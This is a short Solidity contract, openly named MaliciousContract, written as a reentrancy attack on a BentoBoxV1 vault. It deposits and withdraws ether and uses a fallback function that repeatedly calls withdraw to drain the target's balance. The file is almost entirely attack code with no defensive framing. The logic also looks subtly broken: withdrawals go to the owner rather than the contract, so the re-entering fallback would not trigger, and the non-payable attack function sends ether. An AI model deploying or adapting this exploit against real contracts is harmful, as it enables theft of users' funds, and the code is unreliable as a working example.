// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./BentoBoxV1.sol"; // Import BentoBoxV1 contract

contract MaliciousContract {
    address public owner;
    BentoBoxV1 public targetContract;

    constructor(address payable _targetContract) public {
        owner = msg.sender;
        targetContract = BentoBoxV1(_targetContract);
    }

    // Explicitly add a receive function to handle incoming Ether
    receive() external payable {}

    fallback() external payable {
        uint256 balance = address(targetContract).balance;
        if (balance > 0) {
            targetContract.withdraw(IERC20(address(0)), address(this), owner, 1 ether, 0); // Example reentrancy
        }
    }

    function attack() external {
        require(msg.sender == owner, "Not the owner");

        // Initiate deposit and immediate withdraw for reentrancy
        targetContract.deposit{value: 1 ether}(IERC20(address(0)), address(this), owner, 1 ether, 0);
        targetContract.withdraw(IERC20(address(0)), address(this), owner, 1 ether, 0);
    }
}
